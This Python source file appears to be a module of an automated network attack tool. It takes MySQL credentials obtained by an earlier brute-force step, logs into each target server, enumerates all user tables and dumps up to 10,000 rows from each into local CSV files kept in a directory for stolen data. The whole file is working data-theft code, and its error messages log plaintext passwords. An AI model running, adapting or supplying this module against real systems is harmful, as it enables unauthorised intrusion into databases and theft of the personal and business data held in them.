import os
import csv
import logging
import time
import pymysql
from shared import SharedData
from logger import Logger
from timeout_utils import TimeoutContext

# Configure the logger
logger = Logger(name="steal_data_sql.py", level=logging.INFO)

# Define the necessary global variables
b_class = "StealDataSQL"
b_module = "steal_data_sql"
b_status = "steal_data_sql"
b_parent = "SQLBruteforce"
b_port = 3306

class StealDataSQL:
    """
    Class to handle the process of stealing data from SQL servers.
    """
    def __init__(self, shared_data):
        try:
            self.shared_data = shared_data
            self.sql_connected = False
            self.stop_execution = False
            self.b_parent_action = "brute_force_sql"  # Parent action status key
            logger.info("StealDataSQL initialized.")
        except Exception as e:
            logger.error(f"Error during initialization: {e}")

    def connect_sql(self, ip, username, password, database=None):
        """
        Establish a MySQL connection using pymysql with 30 second timeouts.
        """
        try:
            conn = pymysql.connect(
                host=ip,
                user=username,
                password=password,
                database=database,
                port=3306,
                connect_timeout=30,
                read_timeout=30,
                write_timeout=30
            )
            self.sql_connected = True
            logger.info(f"Connected to {ip} via SQL with username {username}" + (f" to database {database}" if database else ""))
            return conn
        except Exception as e:
            logger.error(f"SQL connection error for {ip} with user '{username}' and password '{password}'" + (f" to database {database}" if database else "") + f": {e}")
            return None

    def find_tables(self, conn):
        """
        Find all tables in all databases, excluding system databases.
        """
        try:
            if self.shared_data.orchestrator_should_exit:
                logger.info("Table search interrupted due to orchestrator exit.")
                return []
            query = """
            SELECT TABLE_NAME, TABLE_SCHEMA
            FROM INFORMATION_SCHEMA.TABLES
            WHERE TABLE_SCHEMA NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys')
            AND TABLE_TYPE = 'BASE TABLE'
            """
            tables = []
            with conn.cursor() as cursor:
                cursor.execute(query)
                for row in cursor.fetchall():
                    tables.append([row[0], row[1]])  # TABLE_NAME, TABLE_SCHEMA
            logger.info(f"Found {len(tables)} tables across all databases")
            return tables
        except Exception as e:
            logger.error(f"Error finding tables: {e}")
            return []

    def steal_data(self, conn, table, schema, local_dir):
        """
        Download data from the table in the database to a local file.
        Uses LIMIT clause to prevent fetching huge tables.
        """
        try:
            if self.shared_data.orchestrator_should_exit or self.stop_execution:
                logger.info("Data stealing process interrupted due to orchestrator exit.")
                return
            # Use LIMIT to prevent memory issues with large tables
            query = f"SELECT * FROM {schema}.{table} LIMIT 10000"
            with conn.cursor() as cursor:
                cursor.execute(query)
                rows = cursor.fetchall()
                columns = [desc[0] for desc in cursor.description]

            local_file_path = os.path.join(local_dir, f"{schema}_{table}.csv")
            with open(local_file_path, 'w', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(columns)
                writer.writerows(rows)
            logger.success(f"Downloaded {schema}.{table} ({len(rows)} rows)")
        except Exception as e:
            logger.error(f"Error downloading data from table {schema}.{table}: {e}")

    def execute(self, ip, port, row, status_key):
        """
        Steal data from the remote SQL server.
        """
        start_time = time.time()
        logger.lifecycle_start("StealDataSQL", ip, port)
        try:
            if 'success' in row.get(self.b_parent_action, ''):
                self.shared_data.bjornorch_status = "StealDataSQL"
                logger.info(f"Stealing data from {ip}:{port}...")

                sqlfile = self.shared_data.sqlfile
                credentials = []
                if os.path.exists(sqlfile):
                    with open(sqlfile, 'r', newline='') as f:
                        reader = csv.DictReader(f)
                        for cred_row in reader:
                            if cred_row.get('IP Address') == ip:
                                credentials.append((
                                    cred_row.get('User'),
                                    cred_row.get('Password'),
                                    cred_row.get('Database')
                                ))
                    logger.info(f"Found {len(credentials)} credential combinations for {ip}")

                if not credentials:
                    logger.error(f"No valid credentials found for {ip}. Skipping...")
                    duration = time.time() - start_time
                    logger.lifecycle_end("StealDataSQL", 'failed', duration, ip)
                    return 'failed'

                def handle_timeout():
                    if not self.sql_connected:
                        logger.lifecycle_timeout("StealDataSQL", "SQL connection", 240, ip)
                        self.stop_execution = True

                # Use TimeoutContext instead of Timer(240)
                with TimeoutContext(timeout=240, on_timeout=handle_timeout) as timeout_ctx:
                    success = False
                    for username, password, database in credentials:
                        if timeout_ctx.should_stop or self.stop_execution or self.shared_data.orchestrator_should_exit:
                            logger.info("Steal data execution interrupted.")
                            break
                        try:
                            logger.debug(f"Trying {username} for {ip} db:{database}")
                            # First connect without database to check global permissions
                            conn = self.connect_sql(ip, username, password)
                            if conn:
                                tables = self.find_tables(conn)
                                mac = row['MAC Address']
                                local_dir = os.path.join(self.shared_data.datastolendir, f"sql/{mac}_{ip}/{database}")
                                os.makedirs(local_dir, exist_ok=True)

                                if tables:
                                    for table, schema in tables:
                                        if timeout_ctx.should_stop or self.stop_execution or self.shared_data.orchestrator_should_exit:
                                            break
                                        # Connect to specific database for data theft
                                        db_conn = self.connect_sql(ip, username, password, schema)
                                        if db_conn:
                                            self.steal_data(db_conn, table, schema, local_dir)
                                            db_conn.close()
                                    success = True
                                    counttables = len(tables)
                                    logger.success(f"Successfully stolen data from {counttables} tables on {ip}:{port}")

                                conn.close()

                                if success:
                                    duration = time.time() - start_time
                                    logger.lifecycle_end("StealDataSQL", 'success', duration, ip)
                                    return 'success'
                        except Exception as e:
                            logger.error(f"Error stealing data from {ip} with user '{username}' on database {database}: {e}")

                if not success:
                    logger.error(f"Failed to steal any data from {ip}:{port}")
                    duration = time.time() - start_time
                    logger.lifecycle_end("StealDataSQL", 'failed', duration, ip)
                    return 'failed'
                else:
                    duration = time.time() - start_time
                    logger.lifecycle_end("StealDataSQL", 'success', duration, ip)
                    return 'success'

            else:
                logger.info(f"Skipping {ip} as it was not successfully bruteforced")
                duration = time.time() - start_time
                logger.lifecycle_end("StealDataSQL", 'skipped', duration, ip)
                return 'skipped'

        except Exception as e:
            logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
            duration = time.time() - start_time
            logger.lifecycle_end("StealDataSQL", 'failed', duration, ip)
            return 'failed'

if __name__ == "__main__":
    shared_data = SharedData()
    try:
        steal_data_sql = StealDataSQL(shared_data)
        logger.info("Starting SQL data extraction process...")

        # Load the IPs to process from shared data
        ips_to_process = shared_data.read_data()

        # Execute data theft on each IP
        for row in ips_to_process:
            ip = row["IPs"]
            steal_data_sql.execute(ip, b_port, row, b_status)

    except Exception as e:
        logger.error(f"Error in main execution: {e}")
